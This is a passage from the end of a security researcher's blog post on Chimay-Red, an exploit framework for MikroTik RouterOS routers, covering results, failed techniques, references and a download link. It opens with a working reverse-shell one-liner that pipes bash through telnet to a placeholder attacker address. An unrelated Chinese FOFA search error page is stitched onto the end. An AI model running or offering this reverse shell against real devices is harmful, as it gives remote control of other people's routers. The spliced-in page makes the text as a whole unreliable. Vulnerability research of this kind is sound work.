+Getting a reverse shell without existing telnet access for devel-login
+mknod /tmp/pipe p;telnet <attacker_ip> <attacker_port></tmp/pipe|bash>/tmp/pipe
+This command creates a READ|WRITE fifo-file pipe in memory using mknod and redirects the standard-in and out of bash to the pipe and out through telnet.
+Sending text to the LCD
+"echo hello world > /dev/lcd"
+image courtesy of BigNerd - Chimay-Red Github
+See it live!
+Chimay-Red in action:
+Chimay-Red in debug mode:
+Conclusions & Future Work
+So did I accomplish my goals in the end? Well almost.
+In the end I was able to exploit every stable release version for all architectures except TILE and ARM. Now you are probably wondering, "what the hell is TILE". It is for that specific reason why I was unable to support TILE. As for ARM, I have not had enough time to go through and test the ROP builder for ARM as of yet, but I hope to fully support the architecture soon.
+I was also unable to complete the command for custom_shellcode as I am not able to get a mprotect ROP-chain working for all architectures and versions.
+As for "Containerize and optionally emulate any system firmware for fuzzing and testing", I will be going over how to containerize and mass deploy swarms of RouterOS systems via Docker and libvirt in a later post so stay tuned :).
+Ideas that didn't work:
+I attempted to leak pointers from the heap by using a content-length of zero and sending small amounts of data into istream::read(). This resulted in some valid addresses being leaked from various areas of the process memory, although I was unable to use it in any way to predict ASLR offsets because of a lack of predictability in the leaked addresses. If the leaked addresses were in fact predictable in terms of their location in the process memory in correlation to the other threads and library load order on some systems it could possibly allow ROP chains to be crafted on the fly without the need of the target source webserver binary version.
+Chimay-Blue?
+Recently MK has fallen victim to an 0day against its Samba service within RouterOS: CVE-2018-7445, allowing for remote code execution. I hope to continue to build upon my existing Chimay-Red framework to integrate it. This should allow me to expand the 6.x exploit set past 6.38.5 and up to 6.41.2.
+Famous MK Forum Quotes:
+"Also, it seems that this exploit may not be functional in RouterOS version above v6.30.1"
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+"After a thorough code review, we could not find anything hinting to the described issues."
+https://forum.mikrotik.com/viewtopic.php?f=21&t=119308&sid=ab6ad0f8565e550e36b99cb29e2e27da&start=50#p619740
+In the end, a span of approximately four years elapsed since the vulnerability was introduced until the time it was fixed. Four years should be enough for multiple competent code reviews to catch a blatant integer overflow in a critical function like reading user POST data. The fact this small issue was not discovered and fixed for so long, leads myself and I'm sure others to believe MK doesn't do code reviews or does not complete them often. If you are reading this MK, maybe stop custom writing and maintaining your: Webserver, Samba Server, RADIUS server, SSH server, TELNET server, FTP server, etc. Clearly you can't.
+References
+https://wikileaks.org/ciav7p1/cms/page_16384604.html
+https://wikileaks.org/ciav7p1/cms/page_16384512.html
+https://securelist.com/apt-slingshot/84312/
+Software Used
+Analysis:
+- IDA Pro
+- Binary Ninja
+- BinNavi
+Exploit:
+- pwntools
+- GDB
+- GDB PEDA
+- GEF
+- Binutils Collection
+Download
+Chimay-Red and MikroDB are freely available for download on GitHub:
+https://github.com/seekintoo/chimay-red
+About the Author
+Dayton Pidhirney is a Cybersecurity Researcher at Seekintoo. Dayton is an EE geek and is also Co-Founder of FirePick Services LLC., a maker-grade pick and place machine. Dayton's desk always has wires, screws, components and tools on it. Always. Seriously Dayton, clean your desk...
+Comments, concerns, and corrections are welcome and not triaged by any marketing machine we are aware of: dpidhirney (at) seekintoo (dot) com
+Categories
+arcsight
+careers
+ctf
+research
+Social
+twitter
+linkedin
+github
+© 2018 Seekintoo Ltd. and/or its affiliates.
+All rights reserved. Privacy Policy
+===============https://www.fofa.so/result?qbase64...================
+FOFA Pro - 错误
+问题反馈
+问题反馈关闭
+请详细描述您要反馈的内容
+请留下您的手机号或邮箱，方便我们与您联系(选填)
+验证码
+提交
+规则专题
+API&SDK
+规则列表
+Fofa客户端
+VIP会员
+切换导航
+规则列表
+规则专题
+企业版
+API&SDK
+客户端
+VIP会员
++1积分
+登录与注册
+出错了!
+查询失败, 请检查后重试
+白帽汇
+服务热线：400-650-2031
+联系邮箱：service@baimaohui.net
+地址：北京市朝阳区东三环北路天元港B座10层
+产品
+企业版>
+NOSEC
+FOEYE
+BCSEC
+信息
+关于我们
+帮助文档
+English
+&nbsp &nbsp 简体中文
+zh-CN
+版权所有 © 白帽汇 2015 - 2019. All Rights Reserved 粤ICP备16088626号. Version 3.4.272
